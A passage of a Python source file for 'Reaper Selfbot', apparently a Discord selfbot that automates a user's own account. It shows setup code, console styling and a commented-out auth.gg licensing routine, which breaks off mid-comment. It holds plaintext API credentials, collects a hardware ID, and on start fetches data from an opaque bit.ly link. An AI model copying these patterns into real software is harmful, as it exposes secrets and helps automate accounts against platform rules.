
# PART I: Import Modules

try:
    
    x = open("login.json", "x")
    x.close()
    f = open("login.json", "w").write("{}")
    f.close()
except:
    pass

from multiprocessing import context
import os, ctypes
from time import sleep
from typing import Dict

from discord import user
from discord.channel import TextChannel
from discord.errors import Forbidden, HTTPException, NotFound
from discord.ext.commands.core import command
from requests import exceptions
from yaml import tokens

os.system("mode con: lines=31 cols=116")
ctypes.windll.kernel32.SetConsoleTitleW("Importing assets...")

#try:
import stdiomask, colorama , hashlib , functools , struct, urllib, math, winsound, psutil
import certifi, yaml, plyer, win10toast, subprocess , win32con, multiprocessing, codecs
import discord, datetime, pyfiglet, requests , itertools , threading, tkinter, glob
import re, sys, json, base64, random, asyncio, aiohttp, string, io, urllib3
import pymem.process, pymem, keyboard , urllib3, win32api, time as pytime

from lxml import etree
from os import replace#
from gtts import gTTS ##
from os import system ###
from re import findall ###
from random import randint
from itertools import cycle
from base64 import b64decode
from os.path import splitext
from threading import Thread
from discord.abc import User
from multiprocessing import *
import datetime as pydatetime
from datetime import datetime
try:    from pil import Image
except: from PIL import Image
from logging import exception
from json import loads, dumps
from plyer import notification
from tkinter import messagebox
from requests.api import delete
from tkinter.constants import N
from attr import __description__
from discord.ext import commands
from subprocess import Popen, PIPE
from asyncio import sleep as asleep
from multiprocessing import Process
from json import decoder, dump, load
from bs4 import BeautifulSoup as bs4
from requests.sessions import  session
import plyer.platforms.win.notification
from win32gui import  Shell_NotifyIcon#
from tkinter import Label, messagebox,Tk
from urllib.request import Request,urlopen
from urllib.parse import quote as uriquote
from colorama import init, Fore, Back, Style
from urllib.parse import parse_qs, quote_plus
from win10toast import ToastNotifier as toaster
try: from pil import Image, ImageDraw, ImageFont
except: from PIL import Image, ImageDraw, ImageFont
from requests.exceptions import ProxyError,SSLError
from math import atan2, sqrt, pi, asin, isnan, atan
from win32api import GetModuleHandle , PostQuitMessage
from win32gui import GetWindowText, GetForegroundWindow
from win32gui import CreateWindow , UpdateWindow,LoadImage
from win32gui import WNDCLASS , DestroyWindow , RegisterClass
from win32gui import LoadIcon  , NIF_ICON , NIF_MESSAGE, NIF_TIP
from requests.exceptions  import  ConnectionError , InvalidProxyURL
from win32gui import  NIM_ADD ,  NIM_MODIFY  ,  NIF_INFO  , NIM_DELETE
#except Exception as e:
    #print(f'Error -> {e}')
    #sleep(2)
    #os._exit(0)

def assetcreate():
    try:
        try: os.mkdir("./assets")
        except: pass
        res = requests.get("https://cdn.discordapp.com/attachments/807871379219021826/811598861789167626/ripthing", allow_redirects=True)
        open("./assets/thingrip.png", "wb").write(res.content)
        res = requests.get("https://cdn.discordapp.com/attachments/807871379219021826/811597529690538014/Scheherazade-Regular.ttf", allow_redirects=True)
        open("./assets/font.ttf", "wb").write(res.content)
        res = requests.get("https://cdn.discordapp.com/attachments/807871379219021826/811237602077310976/Tabitha.ttf", allow_redirects=True)
        open("./assets/Tabitha.ttf", "wb").write(res.content)
        res = requests.get("https://cdn.discordapp.com/attachments/809818922911137794/816156218077872138/reb.ico", allow_redirects=True)
        open("./assets/logo.ico", "wb").write(res.content)
        try:
            open('./assets/reaper.log', "x")
        except:
            pass
    except:
        pass
    
assetcreate()

# PART II: Define

root = tkinter.Tk()
root.withdraw()
class s():
    space = " "*2
    # SECTION SIGN MARKS (LIGHT)
    sred = Style.BRIGHT+"["+Fore.RED+" \u00a7 "+Fore.WHITE+"] "
    syellow = Style.BRIGHT+"["+Fore.YELLOW+" \u00a7 "+Fore.WHITE+"] "
    sgreen = Style.BRIGHT+"["+Fore.GREEN+" \u00a7 "+Fore.WHITE+"] "
    scyan = Style.BRIGHT+"["+Fore.CYAN+" \u00a7 "+Fore.WHITE+"] "
    sblue = Style.BRIGHT+"["+Fore.BLUE+" \u00a7 "+Fore.WHITE+"] "
    smagenta = Style.BRIGHT+"["+Fore.MAGENTA+" \u00a7 "+Fore.WHITE+"] "
    # EXCLAMATION MARKS (LIGHT)
    red = Style.BRIGHT+"["+Fore.RED+" ! "+Fore.WHITE+"] "
    yellow = Style.BRIGHT+"["+Fore.YELLOW+" ! "+Fore.WHITE+"] "
    green = Style.BRIGHT+"["+Fore.GREEN+" ! "+Fore.WHITE+"] "
    cyan = Style.BRIGHT+"["+Fore.CYAN+" ! "+Fore.WHITE+"] "
    blue = Style.BRIGHT+"["+Fore.BLUE+" ! "+Fore.WHITE+"] "
    magenta = Style.BRIGHT+"["+Fore.MAGENTA+" ! "+Fore.WHITE+"] "
    # QUESTION MARKS (LIGHT)
    qred = Style.BRIGHT+"["+Fore.RED+" ? "+Fore.WHITE+"] "
    qyellow = Style.BRIGHT+"["+Fore.YELLOW+" ? "+Fore.WHITE+"] "
    qgreen = Style.BRIGHT+"["+Fore.GREEN+" ? "+Fore.WHITE+"] "
    qcyan = Style.BRIGHT+"["+Fore.CYAN+" ? "+Fore.WHITE+"] "
    qblue = Style.BRIGHT+"["+Fore.BLUE+" ? "+Fore.WHITE+"] "
    qmagenta = Style.BRIGHT+"["+Fore.MAGENTA+" ? "+Fore.WHITE+"] "
    # EXLAMATION MARKS (DARK)
    dred = Style.BRIGHT+"["+Style.RESET_ALL+Fore.RED+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    dyellow = Style.BRIGHT+"["+Style.RESET_ALL+Fore.YELLOW+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    dgreen = Style.BRIGHT+"["+Style.RESET_ALL+Fore.GREEN+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    dcyan = Style.BRIGHT+"["+Style.RESET_ALL+Fore.CYAN+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    dblue = Style.BRIGHT+"["+Style.RESET_ALL+Fore.BLUE+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    dmagenta = Style.BRIGHT+"["+Style.RESET_ALL+Fore.MAGENTA+" ! "+Fore.WHITE+Style.BRIGHT+"] "
    # SECTION SIGN MARKS (DARK)
    dsred = Style.BRIGHT+"["+Style.RESET_ALL+Fore.RED+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    dsyellow = Style.BRIGHT+"["+Style.RESET_ALL+Fore.YELLOW+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    dsgreen = Style.BRIGHT+"["+Style.RESET_ALL+Fore.GREEN+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    dscyan = Style.BRIGHT+"["+Style.RESET_ALL+Fore.CYAN+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    dsblue = Style.BRIGHT+"["+Style.RESET_ALL+Fore.BLUE+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    dsmagenta = Style.BRIGHT+"["+Style.RESET_ALL+Fore.MAGENTA+" \u00a7 "+Fore.WHITE+Style.BRIGHT+"] "
    # QUESTION MARKS (DARK)
    dqred = Style.BRIGHT+"["+Style.RESET_ALL+Fore.RED+" ? "+Fore.WHITE+Style.BRIGHT+"] "
    dqyellow = Style.BRIGHT+"["+Style.RESET_ALL+Fore.YELLOW+" ? "+Fore.WHITE+Style.BRIGHT+"] "
    dqgreen = Style.BRIGHT+"["+Style.RESET_ALL+Fore.GREEN+" ? "+Fore.WHITE+Style.BRIGHT+"] "
    dqcyan = Style.BRIGHT+"["+Style.RESET_ALL+Fore.CYAN+" ? "+Fore.WHITE+Style.BRIGHT+"] "
    dqblue = Style.BRIGHT+"["+Style.RESET_ALL+Fore.BLUE+" ? "+Fore.WHITE+Style.BRIGHT+"] "
    dqmagenta = Style.BRIGHT+"["+Style.RESET_ALL+Fore.MAGENTA+" ? "+Fore.WHITE+Style.BRIGHT+"] "
class REAPER():
    try:
        res = requests.get("http://bit.ly/b2ed97f86d2efdb0113b5f200d094b64a06f9648377e1de4082e7cd87d6f4e43b4b8439409c38ddc3d1570eba41d37f3ba4026904e789ca5a5adb2bc68ad66958243e64141de8fa425d781f8e30ef636b071d6f449b9af436ddc19a8c9f76a5a02d9f09", allow_redirects=True).json()
        start_time = datetime.utcnow()
        __version__ = res["version"]
        __MOTD__ = 'test'
    except Exception as e:
        print(e)
        exit()
CURRENT_VERSION = REAPER.__version__
def checkVer():
    return # remove this to enable
    if CURRENT_VERSION != REAPER.__version__:
        qwe = {"Error":{"value":"Invalid/Outdated Version!","tip":"Update the selfbot using the installer."}}
        ctypes.windll.kernel32.SetConsoleTitleW(f'Error -> {qwe["Error"]["value"]} {qwe["Error"]["tip"]}')
        os.system('mode con: lines=12 cols=100')
        print("\n\n")
        print(s.space+s.space+s.red+"Your current version is outdated! Use the installer to update the selfbot. For support,\n"+" "*10+"join the community discord at https://discord.gg/rQJZDpaxv6 and open a ticket.\n\n\n"+" "*35+Style.RESET_ALL+"Feel free to close this window.")
        sleep(999999)
        os._exit(0)

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))
def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor
try:
    with open('./assets/reaper.log', mode='r') as linesread:
        lines = (''.join(''.join(str(''.join(linesread.readlines())))))
except:
    with open('./assets/reaper.log', mode='w') as l:
        l.write("\n")
def cmdused(cmd):
    try:
        with open('./assets/reaper.log', mode='a', encoding='UTF-8', errors='strict', buffering=1) as d:
            d.write(f'[{timenow()}] - CMD USED :: {prefix}{cmd}\n')
    except:
        c = open('./assets/reaper.log', 'w')
        c.write(f'{logs}Created Logs file')
    print(" "*2+s.dyellow+f'{Fore.YELLOW}{Style.BRIGHT}Command Used{Fore.WHITE}: {cmd}')
def addlog(text):
    print(logs+f'{text}')
    try:
        with open('./assets/reaper.log', mode='a', encoding='UTF-8', errors='strict', buffering=1) as d:
            d.write(f'[{timenow()}] - LOGS :: {text}\n')
    except:
        c = open('./assets/reaper.log', 'w')
        c.write(f'{logs}Created Logs file')
def lognoPrint(text):
    try:
        with open('./assets/reaper.log', mode='a', encoding='UTF-8', errors='strict', buffering=1) as d:
            d.write(f'[{timenow()}] - LOGS | {text}\n')
    except:
        c = open('./assets/reaper.log', 'w')
        c.write(f'[{timenow()}] - Created Logs file')
def _center(text: str, length: int, character: str = " "): return character * length + text
letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
temp_name = f'{RandString()}-rpr'
lightbluecol = Style.RESET_ALL + Fore.CYAN
errorcol = s.space+Fore.RESET + "[" + Fore.RED + Style.BRIGHT + " ! " + Fore.RESET + "] " + Fore.WHITE
timenow = lambda: datetime.now().strftime("%H:%M:%S")
#time = " "*2+Fore.RESET + "[" + Fore.CYAN + Style.BRIGHT + timenow() + Fore.RESET + "] "
time = " "*2+s.yellow
logs = " "*2+Fore.WHITE + Style.BRIGHT + "Logs " + Style.RESET_ALL + "| " + Style.BRIGHT
class c():
    b = Style.BRIGHT
class DataIO():
    def save_json(self, filename, data):
        """Atomically save a JSON file given a filename and a dictionary."""
        path, ext = splitext(filename)
        tmp_file = "{}.{}.tmp".format(path, randint(1000, 9999))
        with open(tmp_file, 'w', encoding='utf-8') as f:
            dump(data, f, indent=4,sort_keys=True,separators=(',',' : '))
        try:
            with open(tmp_file, 'r', encoding='utf-8') as f:
                data = load(f)
        except decoder.JSONDecodeError:
            print("Attempted to write file {} but JSON "
                                  "integrity check on tmp file has failed. "
                                  "The original file is unaltered."
                                  "".format(filename))
            return False
        except Exception as e:
            print('A issue has occured saving ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        replace(tmp_file, filename)
        return True
    def load_json(self, filename):
        """Load a JSON file and return a dictionary."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = load(f)
            return data
        except Exception as e:
            print('A issue has occured loading ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return {}
    def append_json(self, filename, data):
        """Append a value to a JSON file."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                file = load(f)
        except Exception as e:
            print('A issue has occured loading ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        try:
            file.append(data)
        except Exception as e:
            print('A issue has occured updating ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        path, ext = splitext(filename)
        tmp_file = "{}.{}.tmp".format(path, randint(1000, 9999))
        with open(tmp_file, 'w', encoding='utf-8') as f:
            dump(file, f, indent=4,sort_keys=True,separators=(',',' : '))
        try:
            with open(tmp_file, 'r', encoding='utf-8') as f:
                data = load(f)
        except decoder.JSONDecodeError:
            print("Attempted to write file {} but JSON "
                                  "integrity check on tmp file has failed. "
                                  "The original file is unaltered."
                                  "".format(filename))
            return False
        except Exception as e:
            print('A issue has occured saving ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        replace(tmp_file, filename)
        return True
    def is_valid_json(self, filename):
        """Verify that a JSON file exists and is readable. Take in a filename and return a boolean."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = load(f)
            return True
        except (FileNotFoundError, decoder.JSONDecodeError):
            return False
        except Exception as e:
            print('A issue has occured validating ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
dataIO = DataIO()
def load_config():
    with open('settings/config.json', 'r') as f:
        return json.load(f)
def load_optional_config():
    with open('settings/optional_config.json', 'r') as f:
        return json.load(f)
def load_moderation():
    with open('settings/moderation.json', 'r') as f:
        return json.load(f)
def load_notify_config():
    with open('settings/notify.json', 'r') as f:
        return json.load(f)  
def load_log_config():
    with open('settings/log.json', 'r') as f:
        return json.load(f)
def has_passed(oldtime):
    if time.time() - 20.0 < oldtime:
        return False
    return time.time()
def set_status(bot):
    if bot.default_status == 'idle':
        return discord.Status.idle
    elif bot.default_status == 'dnd':
        return discord.Status.dnd
    else:
        return discord.Status.invisible
def user_post(key_users, user):
    if time.time() - float(key_users[user][0]) < float(key_users[user][1]):
        return False, [time.time(), key_users[user][1]]
    else:
        log = dataIO.load_json("settings/log.json")
        now = time.time()
        log["keyusers"][user] = [now, key_users[user][1]]
        dataIO.save_json("settings/log.json", log)
        return True, [now, key_users[user][1]]
def gc_clear(gc_time):
    if time.time() - 3600.0 < gc_time:
        return False
    return time.time()
def game_time_check(oldtime, interval):
    if time.time() - float(interval) < oldtime:
        return False
    return time.time()
def avatar_time_check(oldtime, interval):
    if time.time() - float(interval) < oldtime:
        return False
    return time.time()
def embed_perms(message):
    try:
        check = message.author.permissions_in(message.channel).embed_links
    except:
        check = True
    return check
def get_user(message, user):
    try:
        member = message.mentions[0]
    except:
        member = message.guild.get_member_named(user)
    if not member:
        try:
            member = message.guild.get_member(int(user))
        except ValueError:
            pass
    if not member:
        return None
    return member
def find_channel(channel_list, text):
    if text.isdigit():
        found_channel = discord.utils.get(channel_list, id=int(text))
    elif text.startswith("<#") and text.endswith(">"):
        found_channel = discord.utils.get(channel_list,
        id=text.replace("<", "").replace(">", "").replace("#", ""))
    else:
        found_channel = discord.utils.get(channel_list, name=text)
    return found_channel
async def get_google_entries(query, session=None):
    if not session:
        session = aiohttp.ClientSession()
    url = 'https://www.google.com/search?q={}'.format(uriquote(query))
    params = {
        'safe': 'off',
        'lr': 'lang_en',
        'h1': 'en'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64)'
    }
    entries = []
    async with session.get(url, params=params, headers=headers) as resp:
        if resp.status != 200:
            config = load_optional_config()
            async with session.get("https://www.googleapis.com/customsearch/v1?q=" + quote_plus(query) + "&start=" + '1' + "&key=" + config['google_api_key'] + "&cx=" + config['custom_search_engine']) as resp:
                result = json.loads(await resp.text())
            return None, result['items'][0]['link']
        try:
            root = etree.fromstring(await resp.text(), etree.HTMLParser())
            search_nodes = root.findall(".//div[@class='g']")
            for node in search_nodes:
                url_node = node.find('.//h3/a')
                if url_node is None:
                    continue
                url = url_node.attrib['href']
                if not url.startswith('/url?'):
                    continue
                url = parse_qs(url[5:])['q'][0]
                entries.append(url)
        except NameError:
            root = bs4(await resp.text(), 'html.parser')
            for result in root.find_all("div", class_='g'):
                url_node = result.find('h3')
                if url_node:
                    for link in url_node.find_all('a', href=True):
                        url = link['href']
                        if not url.startswith('/url?'):
                            continue
                        url = parse_qs(url[5:])['q'][0]
                        entries.append(url)
    return entries, root
async def hastebin(content, session=None):
    if not session:
        session = aiohttp.ClientSession()
    async with session.post("https://hastebin.com/documents", data=content.encode('utf-8')) as resp:
        if resp.status == 200:
            result = await resp.json()
            return "https://hastebin.com/" + result["key"]
        else:
            return "Error with creating Hastebin. Status: %s" % resp.status

# PART III: Titles

def titlenoout():
    os.system('cls')
    sys.stdout.write("\n\n\n\n")
    a = [
        "╒╦════╗╒╦════╕╔═════╗╒╦═════╕╒╦════╕╒╦════╗",
        " ║    ║ ║     ║     ║ ║     ║ ║      ║    ║",
        " ╠═══╦╝ ╠═══╡ ╠═════╣ ╠═════╝ ╠═══╡  ╠═══╦╝",
        " ║   ╚╗ ║     ║     ║ ║       ║      ║   ╚╗",
        " ╨    ╨╘╩════╛╨     ╨ ╨      ╘╩════╛ ╨    ╨"
    ]
    for i in a:
        print(Fore.LIGHTBLACK_EX+i.center(int(str(os.get_terminal_size()).split("os.terminal_size(columns=")[1].split(", lines=")[0])))
    sleep(0.5)
    os.system('cls')
def title(m: int=2, r=None):
    #init()
    spac = " "*34
    res = Fore.RESET if r == True else "\033[38;5;61m" if r == False else ""
    if compat == False:
        color_l1 = "\033[38;5;75m" 
        color_l2 = "\033[38;5;68m" 
        color_l3 = "\033[38;5;62m" 
        color_l4 = "\033[38;5;61m" 
        color_l5 = "\033[38;5;60m" 
        color_l6 = "\033[38;5;62m"
    else:
        color_l1 = lightbluecol
        color_l2 = lightbluecol
        color_l3 = lightbluecol
        color_l4 = lightbluecol
        color_l5 = lightbluecol
        color_l6 = lightbluecol
    white = Fore.WHITE + Style.BRIGHT 
    def print1():
        print("\n"*m)
        print(spac+white+ "██████" + color_l1 + "╗ " +white+ "███████" + color_l1 + "╗ " +white+ "█████" + color_l1 + "╗ " +white+ "██████" + color_l1 + "╗ " +white+ "███████" + color_l1 + "╗" +white+ "██████" + color_l1 + "╗"+Fore.RESET)
        print(spac+white+ "██" + color_l2 + "╔══" +white+ "██" + color_l2 + "╗" +white+ "██" + color_l2 + "╔════╝" +white+ "██" + color_l2 + "╔══" +white+ "██" + color_l2 + "╗" +white+ "██" + color_l2 + "╔══" +white+ "██" + color_l2 + "╗" +white+ "██" + color_l2 + "╔════╝" +white+ "██" + color_l2 + "╔══" +white+ "██" + color_l2 + "╗"+Fore.RESET)
        print(spac+white+ "██████" + color_l3 + "╔╝" +white+ "█████" + color_l3 + "╗  " +white+ "███████" + color_l3 + "║" +white+ "██████" + color_l3 + "╔╝" +white+ "█████" + color_l3 + "╗  " +white+ "██████" + color_l3 + "╔╝"+Fore.RESET)
        print(spac+white+ "██" + color_l4 + "╔══" +white+ "██" + color_l4 + "╗" +white+ "██" + color_l4 + "╔══╝  " +white+ "██" + color_l4 + "╔══" +white+ "██" + color_l4 + "║" +white+ "██" + color_l4 + "╔═══╝ " +white+ "██" + color_l4 + "╔══╝  " +white+ "██" + color_l4 + "╔══" +white+ "██" + color_l4 + "╗"+Fore.RESET)
        print(spac+white+ "██" + color_l5 + "║  " +white+ "██" + color_l5 + "║" +white+ "███████" + color_l5 + "╗" +white+ "██" + color_l5 + "║  " +white+ "██" + color_l5 + "║" +white+ "██" + color_l5 + "║     " +white+ "███████" + color_l5 + "╗" +white+ "██" + color_l5 + "║  " +white+ "██" + color_l5 + "║"+Fore.RESET)
        print(spac+color_l6+"╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝"+res)
    def print2():
        print("\n"*m)
        colors1 = spac + color_l1
        colors2 = spac + color_l2
        colors3 = spac + color_l3
        colors4 = spac + color_l4
        colors5 = spac + color_l5
        title_var = f"""
 {colors1} ╒╦════╗╒╦════╕╔═════╗╒╦═════╗╒╦════╕╒╦════╗
 {colors2}  ║    ║ ║     ║     ║ ║     ║ ║      ║    ║
 {colors3}  ╠═══╦╝ ╠═══╡ ╠═════╣ ╠═════╝ ╠═══╡  ╠═══╦╝
 {colors4}  ║   ╚╗ ║     ║     ║ ║       ║      ║   ╚╗
 {colors5}  ╨    ╨╘╩════╛╨     ╨ ╨      ╘╩════╛ ╨    ╨
        """
        print(title_var+res)

    print2()
def stripline():
    sys.stdout.write(" "*33)
    if compat == False:
        colors = {
        1: "\033[4m\033[38;5;23m",
        2: "\033[4m\033[38;5;24m",
        3: "\033[4m\033[38;5;25m",
        4: "\033[4m\033[38;5;61m",
        5: "\033[4m\033[38;5;62m" }
    if compat == True:
        colors = {
        1: lightbluecol,
        2: lightbluecol,
        3: lightbluecol,
        4: lightbluecol,
        5: lightbluecol }
    def color_(m: int, n: int = 5):
        m: int
        n: int
        if m == 0:
            clr = ""
            for idx in range(n):
                clr += f'{colors[idx + 1]} '*3
            return clr
        elif m == -1:
            clr = ""
            for idx in range(n):
                clr += f'{colors[n - (idx)]} '*3
            return clr
    print(color_(0)+"\033[4m "*8+"Login"+" "*7+color_(-1)+Style.RESET_ALL)
    print("\n")
def stripline2():
    sys.stdout.write(" "*33)
    colors = {
        1: "\033[4m\033[38;5;23m",
        2: "\033[4m\033[38;5;24m",
        3: "\033[4m\033[38;5;25m",
        4: "\033[4m\033[38;5;61m",
        5: "\033[4m\033[38;5;62m"
    }
    def color_(m: int, n: int = 5):
        m: int
        n: int
        if m == 0:
            clr = ""
            for idx in range(n):
                clr += f'{colors[idx + 1]} '*3
            return clr
        elif m == -1:
            clr = ""
            for idx in range(n):
                clr += f'{colors[n - (idx)]} '*3
            return clr
    print(color_(0)+"\033[4m "*8+"Auth"+" "*8+color_(-1)+Style.RESET_ALL)
    print("\n")
def title2():
    print("\n\n")
    spac = " "*34
    if compat == False:
        colors1 = spac + "\033[38;5;239m"
        colors2 = spac + "\033[38;5;238m"
        colors3 = spac + "\033[38;5;237m"
        colors4 = spac + "\033[38;5;236m"
        colors5 = spac + "\033[38;5;235m"
    else:
        colors1 = Fore.LIGHTBLACK_EX
        colors2 = Fore.LIGHTBLACK_EX
        colors3 = Fore.LIGHTBLACK_EX
        colors4 = Fore.LIGHTBLACK_EX
        colors5 = Fore.LIGHTBLACK_EX
    title_var = f"""
 {colors1} ╒╦════╗╒╦════╕╔═════╗╒╦═════╕╒╦════╕╒╦════╗
 {colors2}  ║    ║ ║     ║     ║ ║     ║ ║      ║    ║
 {colors3}  ╠═══╦╝ ╠═══╡ ╠═════╣ ╠═════╝ ╠═══╡  ╠═══╦╝
 {colors4}  ║   ╚╗ ║     ║     ║ ║       ║      ║   ╚╗
 {colors5}  ╨    ╨╘╩════╛╨     ╨ ╨      ╘╩════╛ ╨    ╨
    """
    print(title_var)
    sleep(0.9)
    os.system('cls')
def loading1(text):
    print("\n\n\n\n\n")
    load_str = text
    ls_len = len(load_str)
    animation = "|/-\\"
    anicount = 0
    counttime = 0
    i = 0
    while (counttime != 50):
        sleep(0.05)
        load_str_list = list(load_str)
        x = ord(load_str_list[i])
        y = 0
        if x != 32 and x != 46:
            if x>90:
                y = x-32
            else:
                y = x + 32
            load_str_list[i]= chr(y)
        res =''
        for j in range(ls_len):
            res = res + load_str_list[j]
        sys.stdout.write("\r"+" "*35+errorcol+res +" "+ animation[anicount])
        sys.stdout.flush()
        load_str = res
        anicount = (anicount + 1)% 4
        i =(i + 1)% ls_len
        counttime = counttime + 1
def end(): return 0
async def disableCmd(ctx, _del = True):
    if isinstance(ctx.channel, discord.TextChannel):
        if reaper.user.id == 417930681687998464:
            return -1
        if ctx.guild.id == 777402119585005568 or ctx.guild.id in config["Config"]["BlacklistServerIDs"]: 
            print(errorcol+"Commands has been blacklisted for this server.")
            try: await ctx.message.delete() if _del == True else end(); return 0 
            except: pass
        else: return -1
    else: return -1

# PART IV: Making Colors work on windows
try: config = yaml.load(open("./config.yml"), Loader=yaml.FullLoader)
except Exception as e: print(logs+f"{e}"); sleep(5); os._exit(0)
compat = config["Config"]["CompatibleMode"]
if compat == False: os.system("color")
else: init()

# PART V: Auth

ctypes.windll.kernel32.SetConsoleTitleW("Reaper Auth Menu")
#titlenoout()
#title2()
#title()
#stripline2()
#print(_center(f"{Style.BRIGHT}Welcome to Reaper Selfbot. Press any key to continue.\n\n", 34))
#os.system('pause >nul')
#hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
#BUF_SIZE = 65536
#md5 = hashlib.md5()
#clear = lambda: os.system('cls')
#try:
  #  with open(sys.argv[0], 'rb') as f:
   #     while True:
    #        data = f.read(BUF_SIZE)
     #       if not data:
      #          break
       #     md5.update(data)
#except:
 #   messagebox.showerror('Reaper Authentication', 'Hash Calculating Failed')
  #  os._exit(0)
#filehash = md5.hexdigest()
#login_status = 0
#register_status = 0
#apikey = "UAPYZSYWVLMI"
#secret = "9V9uAYEz8tt7s5Sat9qZnuNul8WNTe1qdLN"
#aid = "712906"
#version = "1.0"
#random_ = "your random code here"
#def mainProgram():
 #   ctypes.windll.kernel32.SetConsoleTitleW("Reaper Auth Menu")
  #  print()
   # def integrity_check():
    #    global login_status, register_status
     #   headers = {"User-Agent": "AuthGG"}
      #  data = {
       #     "type": "start",
        #    "random": random,
         #   "secret": secret,
          ##  'aid': aid,
            #'apikey': apikey
        #}
     #   try:
      #      with requests.Session() as sess:
       #         sess.trust_env = False
        #        request_1 = sess.post("https://api.auth.gg/version2/api.php", verify=True,data=data, headers=headers)
         #       response_1 = request_1.json()
          #      flag1 = (response_1 == request_1.json())
           #     if flag1:
            #        if response_1["status"] == 'Failed':
             #           messagebox.showerror("Reaper Authentication", "This application is disabled!")
              #          os._exit(0)
               #     if response_1['status'] == "Disabled":
                #        messagebox.showerror("Reaper Authentication", "This application is disabled!")
                 #       os._exit(0)
                  #  if response_1['developermode'] == 'Disabled':
                   #     if response_1['version'] != version:
                    #        messagebox.showinfo("Reaper Authentication", "Update [{}] is available!".format(response_1['version']))
                     #       os.system('start {}'.format(response_1['downloadlink']))
                      #      os._exit(0)
                       # if response_1['hash'] != filehash:
                        #    # messagebox.showerror("Reaper Authentication", "Hashes do not match, file tampering possible!")
                         #   # os._exit(0)
                          #  pass
                     #   if response_1['login'] != "Enabled":
                      #      login_status = 1
                       # if response_1['register'] != "Enabled":
                        #    register_status = 1
                #    else:
                 #       messagebox.showinfo('Reaper Authentication', 'Developer mode is enabled, bypassing security checks!')
             #   else:
          #          os._exit(0)
   #     except:
             #   messagebox.showerror("Reaper Authentication", "Something went wrong!")
           #     os._exit(0)
   # def main_():
     #   clear()
     #   title()
      #  stripline2()
       # print()
       # try:
     #       creds = json.load(open("login.json", "r"))
      #      if creds["auto-login"] == True:
     #           return login()
     #   except:
    #        pass
   #     print(" "*48+f"{Style.RESET_ALL}Please enter an option:\n")
    #    print(" "*42+f"{Style.RESET_ALL}[{c.b} 1 {Style.RESET_ALL}]"+" "*9+f"Login{Style.RESET_ALL}")
     #   print(" "*42+f"{Style.RESET_ALL}[{c.b} 2 {Style.RESET_ALL}]"+" "*8+f"Register{Style.RESET_ALL}")
      #  print(" "*42+f"{Style.RESET_ALL}[{c.b} 3 {Style.RESET_ALL}]  Change Account info\n{Style.RESET_ALL}")
       # option = input(_center("</> ", 2))
      #  if option == "1":
#            login()
#       elif option == "2":
 #           register()
  #      elif option == "3":
   #         changeinfo()
    #    else:
     #       print("\n"+errorcol+" Invalid Option")
      #      sleep(3)
       #     os.system("cls")
        #    title()
         #   stripline()
      #      main_()
 #   def changeinfo():
 #       u = 3
 #       print()
#        while u != 0:
 #           sys.stdout.write("\r"+" "*26+c.b+"You will be redirected to reaper authentication portal in {sec} seconds".format(sec=u))
 #           sleep(1)
 #           u = u - 1
 #       os.system("start Chrome https://auth.gg/portal/ReaperSelfbot")
 #       os.system("cls")
  #      title()
   #     stripline()
    #    print("\n\n")
     #   main_()
  #  def login():
  #      if login_status == 0:
   #         os.system("cls")
    #        title()
     #       stripline2()
      #      global username
       #     global password
        #    try:
         #       print()
          #      _f = "Verifying integrity of files..."
           #     sys.stdout.write(" "*round( (116 - len(_f)) / 2))
            #    for i in range(len(_f)):
             #       sys.stdout.write(Style.RESET_ALL+Fore.WHITE+_f[i % len(_f)])
              #      sys.stdout.flush()
               #     sleep(0.01)
           #     print("\n")
            #    with open("login.json", "r") as f:
             #       credents = json.load(f)
              #      username = credents["username"]
               #     password = credents["password"]
     #           sleep(0.7)
      #          sys.stdout.write(" "*round( (116 - 10) / 2))
       #         _f = "Verified!"
        #        for i in range(len(_f)):
         #           sys.stdout.write(Style.RESET_ALL+Fore.WHITE+_f[i % len(_f)])
          #          sys.stdout.flush()
           #         sleep(0.005)
    #        except Exception as e:
     #           os.system("cls")
      #          title()
       #         stripline2()
      #          print(_center(f"Enter Username: ", 51))
       #         username = input(" "*2+"</> ")
        #        print(_center(f"Enter Password: ", 51))
      #          password = input(" "*2+"</> ")
      #      data = {
      #          "type": "login",
       #         "aid": aid,
        #        "random": random_,
         #       'apikey': apikey,
     #           "secret": secret,
     #           "username": username,
      #          "password": password,
       #         "hwid": hwid
        #    }
   ##         print("\n")
     #       sys.stdout.write(" "*round( (116 - 23) / 2))
      #      _f = "Checking Credentials..."
       #     for i in range(len(_f)):
 #               sys.stdout.write(Style.RESET_ALL+Fore.WHITE+_f[i % len(_f)])
 #               sys.stdout.flush()
 #               sleep(0.005)
  #          headers = {"User-Agent": "AuthGG"}
   #         try:
    #            with requests.Session() as sess:
    #                sess.trust_env = True
     #               request_2 = sess.post('https://api.auth.gg/version2/api.php', verify=True, headers=headers, data=data)
